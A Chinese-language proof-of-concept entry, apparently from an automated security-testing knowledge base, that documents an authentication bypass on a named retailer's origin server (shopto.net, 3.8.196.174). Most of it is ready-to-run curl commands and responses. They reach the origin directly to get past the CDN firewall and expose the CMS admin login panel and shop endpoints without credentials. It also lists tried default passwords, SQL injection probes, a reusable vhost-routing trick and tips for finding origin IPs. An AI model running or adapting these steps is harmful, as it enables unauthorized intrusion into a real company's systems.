# shopto.net 源站 3.8.196.174：*.shopto.net 通配 HTTP Basic 门禁仅覆盖 / 与 /en/，/dc/(DcCMS 后台登录面板)、/module/dcshop/b2c/ajax_*、robots.txt 路径级绕过（cp/production/old/web3 等命名子域均为别名）

- **code**: shopto.net-源站-3.8.196.174-的-.shopto.net-通配-basic-门禁为按路径生效-c
- **kind**: poc
- **category**: auth-bypass
- **component**: Apache / DcCMS 2015 (dcshop) shopto 源站（多 vhost）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 15:27-15:33 UTC，ARTEX 执行机（Windows/Git Bash）curl 8.5.0，--noproxy '*' 直连 shopto.net 源站 3.8.196.174:443。① 对照：Host: cp.shopto.net GET / → HTTP/1.0 401 Unauthorized + Server: Apache（根路径确受 Basic 门禁）；② 同 Host/同源 GET /dc/ → HTTP/1.1 200、Content-Length 2367、Set-Cookie: sidcms=<REDACTED>、<title>Login</title>、<form id="form_admin_login" action="?action=admin_login" method="post">（DcCMS 后台登录面板匿名可达，路径级绕过门禁）；③ GET /module/dcshop/b2c/ajax_cart.php → 200 {"status":"ok","content":"...Shopping Cart..."}（3482B）；④ /robots.txt 200 787B（Disallow: /module/dcshop/b2c/ajax_）、/sitemap.xml 200 503B、/.git/HEAD 403；⑤ cp/production/old/web3 四个 vhost 行为一致；⑥ 门禁变体穷尽（Host 尾点 . / :443 / 大写 / :80）全部仍 401 ⇒ 绕过为路径级而非 Host 变形；⑦ 阴性记录：DcCMS 2015 后台 8 组默认/弱口令全失败、input_login 无 SQLi。据此判定「路径级绕过 Basic 门禁、DcCMS 后台登录面板免认证暴露」成立。
- **path**: pocs/shopto.net-源站-3.8.196.174-的-.shopto.net-通配-basic-门禁为按路径生效-c/poc.md
- **tags**: shopto,origin,3.8.196.174,basic-auth,auth-bypass,auth-validate,path-bypass,dcms,dcshop,vhost,alias,robots.txt,unauthorized
- **created_at**: 2026-11-11T15:35:22.131Z
- **engine**: https://3.8.196.174 (cp/production/old/web3.shopto.net)
- **found_by**: vuln-scan

## 描述

原理：3.8.196.174:443 是 shopto.net 的 CloudFront 源站，其上共置 cp/production/old/web3（及 control/queue/intranet）等多个 *.shopto.net 命名 vhost。运营方只对「/ 与 /en/」这类商城根路径加了 HTTP Basic（realm=Restricted area）门禁，门禁按路径生效、未覆盖全站：使用正确的 *.shopto.net Host，/dc/（DcCMS 2015 后台登录面板）、/module/dcshop/b2c/ajax_*.php 前端接口族、/robots.txt、/sitemap.xml 全部 200 匿名可达。前提：能直连源站 443（绕边缘 WAF），curl -k、本机 --noproxy '*'，Host 用任一 *.shopto.net 子域；无需任何认证。适用面：源站多 vhost 共置 + 仅对部分路径/目录下 Basic 或网关认证的目标——「门禁只挂在某几个 location 上」是最常见的漏配。

## 用法

```
前置：可直连 3.8.196.174:443（shopto.net CloudFront 源站，直连绕边缘 WAF）；curl -k；本机挂代理时加 --noproxy '*' 直连（记录代理的 MITM 对部分路径会返回空）；Host 头用任一 *.shopto.net 子域（cp/production/old/web3 均可）。

【1) 对照：确认根路径受 Basic 门禁保护】
curl -sk --noproxy '*' -D - -o /dev/null -H 'Host: cp.shopto.net' https://3.8.196.174/
# 期望：HTTP/1.0 401 Unauthorized / Server: Apache / Www-Authenticate: Basic realm="Restricted area"

【2) 路径级绕过：同一 Host、同一源站，DcCMS 后台登录面板免认证可达】
curl -sk --noproxy '*' -D - -H 'Host: cp.shopto.net' https://3.8.196.174/dc/ | head
# 期望：HTTP/1.1 200 / Content-Length: 2367 / Set-Cookie: sidcms=... / <title>Login</title>
#       <form id="form_admin_login" action="?action=admin_login" method="post">（input_login / input_password）

【3) 前端接口族同样免认证】
curl -sk --noproxy '*' -H 'Host: cp.shopto.net' https://3.8.196.174/module/dcshop/b2c/ajax_cart.php
# 期望：200 {"status":"ok","content":"...Shopping Cart..."}（3482B）

【4) 其它免认证路径】
curl -sk --noproxy '*' -H 'Host: cp.shopto.net' https://3.8.196.174/robots.txt   # 200 787B，Disallow: /module/dcshop/b2c/ajax_ ...
curl -sk --noproxy '*' -H 'Host: cp.shopto.net' https://3.8.196.174/sitemap.xml  # 200 503B
curl -sk --noproxy '*' -D - -H 'Host: cp.shopto.net' https://3.8.196.174/.git/HEAD # 403（存在但禁访）

【5) 判据（同时成立才算路径级绕过）】
# a. 同一 Host：GET / → 401；GET /dc/ → 200（对照强烈）
# b. 200 的 /dc/ 正文是 DcCMS 后台登录页（含 form_admin_login / input_login），不是 302 登录跳转或错误页
# c. cp/production/old/web3 四个命名子域结果一致（通配门禁，同一后端）

【6) 已证否，别浪费时间（阴性记录）】
# - Host 变形穷尽仍 401：cp.shopto.net.（尾点）/ cp.shopto.net:443 / CP.SHOPTO.NET / cp.shopto.net:80 → 全 401
#   ⇒ 绕过是「路径级」，不是 Host 变形。
# - DcCMS 2015 后台登录：admin/admin、admin/admin123、admin/123456、admin/dcshop、dcshop/dcshop、
#   shopto/shopto、admin/password、admin/admin2015 八组全失败、无锁定提示；DcCMS 2015 无公开 CVE。
# - input_login 无 SQLi：布尔 ' OR '1'='1 / '-- - / "# 无差异；时间盲 SLEEP(5) 0.68s vs 基线 1.17s。
# - 命名子域不是独立后端：放行路径响应体与 Host: localhost 默认 vhost 逐字节一致（同一 docroot/别名）。

【7) Apache 路由特性（可复用）】
# 该源站 Apache 按请求行「绝对 URI」选 vhost 且优先于 Host 头：
#   GET https://localhost/        + Host: control.shopto.net → 200
#   GET https://control.shopto.net/ + Host: localhost        → 401
# 说明可用请求行 URI 与 Host 头不一致来做路由实验。

【8) 失败时的常见原因】
# - Host 用了非 *.shopto.net 值 → 落到默认 vhost（行为不同，见库内条目 529/finding#561）。
# - 源站被 CDN 挡 → 先按证书 SAN / 子域枚举找出不走 CloudFront 的源站 IP 再直连。
# - 本机代理污染 → 必须 --noproxy '*'，否则部分路径返回空、结论失真。
# - 门禁已被修复（加固后通常表现为 /dc/ 也返回 401 或 403）。
```

## 正文

```
# shopto.net 源站 3.8.196.174：*.shopto.net 通配 HTTP Basic 门禁为「路径级」—— /dc/ 等路径免认证可达（DcCMS 后台登录面板暴露）

- 归类：auth-validate control（认证校验/访问控制失效）→ auth-bypass
- 严重度：low（后台登录面板与前端接口未授权可达，但未能进一步打穿）
- 来源：task#4 shopto.net 全流程安全验证，finding_id=86（verdict=verified，status=confirmed）
- 关联条目：527（同源站默认 vhost `/error` 跨租户泄露 + 内网 IP + DcCMS 指纹）；529（用非 `*.shopto.net` Host 落到默认 vhost 绕过 Basic 拿完整 storefront，finding#561）。
- **与 529 的区别**：本条 Host 保持**正确的 `*.shopto.net`**，门禁是被「路径」绕过的（`/` 401 但 `/dc/` 200），而非被 Host 变形绕过到默认 vhost。
- 本条与既有条目 id 556 是同一知识点（556 记录了「命名子域=别名、非独立后端」这一面），已合并刷新。

## 目标 / 入口
- 源站 IP：`3.8.196.174:443`（shopto.net 的 CloudFront 源站，直连可绕边缘 WAF）
- 命名 vhost：`cp.shopto.net` / `production.shopto.net` / `old.shopto.net` / `web3.shopto.net`（另 `control/queue/intranet` 行为一致）
- 入口示例：`https://3.8.196.174/dc/`，请求头 `Host: cp.shopto.net`

## 前置条件
- `3.8.196.174:443` 可达；`curl -k` 忽略证书；本机挂代理时 `--noproxy '*'` 直连（否则部分路径返回空、结论失真）
- HTTP 请求头 `Host` 设为任一 `*.shopto.net` 子域
- 无需任何认证 / cookie

## 复现步骤

### 1) 对照：根路径确受 HTTP Basic 门禁保护
```bash
curl -sk --noproxy '*' -D - -o /dev/null -H 'Host: cp.shopto.net' https://3.8.196.174/
```
```http
HTTP/1.0 401 Unauthorized
Server: Apache
Www-Authenticate: Basic realm="Restricted area"
```

### 2) 关键一步：同一 Host/源站，`/dc/` 未被门禁覆盖，DcCMS 后台登录面板匿名可达
```bash
curl -sk --noproxy '*' -D - -H 'Host: cp.shopto.net' https://3.8.196.174/dc/ | head
```
```http
HTTP/1.1 200 OK
Server: Apache
Set-Cookie: sidcms=<REDACTED>; path=/; SameSite=Strict; secure; HttpOnly
Content-Length: 2367

<title>Login</title>
<form name="form_admin_login" id="form_admin_login" action="?action=admin_login" method="post">
    <input ... name="input_login" ...><input name="input_password" type="password" ...>
```

### 3) dcshop 前端接口族同样免认证
```bash
curl -sk --noproxy '*' -H 'Host: cp.shopto.net' https://3.8.196.174/module/dcshop/b2c/ajax_cart.php
```
```
HTTP/1.1 200 OK   (3482B)
{"status":"ok","content":"...Shopping Cart...","messages":{...}}
```

### 4) 其它免认证路径
```bash
curl -sk --noproxy '*' -H 'Host: cp.shopto.net' https://3.8.196.174/robots.txt    # 200 787B：Disallow: /module/dcshop/b2c/ajax_ ...
curl -sk --noproxy '*' -H 'Host: cp.shopto.net' https://3.8.196.174/sitemap.xml   # 200 503B
curl -sk --noproxy '*' -D - -H 'Host: cp.shopto.net' https://3.8.196.174/.git/HEAD # 403（存在但禁访）
```

### 5) 四个 vhost 行为一致
`cp` / `production` / `old` / `web3.shopto.net` 四者：`/`→401、`/dc/`→200(2367B)、`/robots.txt`→200(787B)、`ajax_cart.php`→200(3482B) 完全相同 ⇒ 通配门禁、同一后端。

## 判据（同时成立才算「路径级绕过」）
1. 同一 Host：`GET /` → 401；`GET /dc/` → 200（对照强烈）。
2. 200 的 `/dc/` 正文是 DcCMS 后台登录页（含 `form_admin_login` / `input_login`），不是 302 登录跳转或错误页。
3. 多个命名子域结果一致。

## 已证否 / 阴性记录（别浪费时间）
- **Host 变形不能绕**：`cp.shopto.net.`（尾点）/ `cp.shopto.net:443` / `CP.SHOPTO.NET` / `cp.shopto.net:80` → **全部 401** ⇒ 绕过是路径级，不是 Host 变形。
- **DcCMS 2015 后台登录打不穿**：8 组默认/弱口令全失败、无锁定提示 —— admin/admin、admin/admin123、admin/123456、admin/dcshop、dcshop/dcshop、shopto/shopto、admin/password、admin/admin2015。DcCMS 2015 无公开 CVE。
- **`input_login` 无 SQLi**：布尔 `' OR '1'='1` / `'-- -` / `"#` 无差异；时间盲 `SLEEP(5)` 0.68s vs 基线 1.17s（无注入）。
- **命名子域不是独立后端**：放行路径的响应体与 `Host: localhost` 默认 vhost 逐字节一致 ⇒ 同一 docroot / 别名（原 556 结论）。
- `/.git/HEAD` → 403（存在但禁访）。

## Apache 路由特性（可复用）
该源站 Apache 按请求行「绝对 URI」选 vhost 且优先于 Host 头：
- `GET https://localhost/` + `Host: control.shopto.net` → 200
- `GET https://control.shopto.net/` + `Host: localhost` → 401

可作其它路由/归属实验的手段。

## 失败时的常见原因
- Host 用了非 `*.shopto.net` 值 → 落到默认 vhost（行为不同，见条目 529 / finding#561）。
- 源站被 CDN 挡 → 先按证书 SAN / 子域枚举找出不走 CloudFront 的源站 IP 再直连。
- 本机代理污染 → 必须 `--noproxy '*'`。
- 门禁已修复 → 加固后 `/dc/` 也会返回 401/403。

## 影响
匿名者可访问 DcCMS 后台登录面板（可对其做口令/逻辑攻击）与 dcshop 前端 ajax 接口族，绕过运营方为这些 vhost 设置的 Basic 访问控制；同时证明该源站直连可绕边缘 WAF，是后续测试的稳定入口。

```
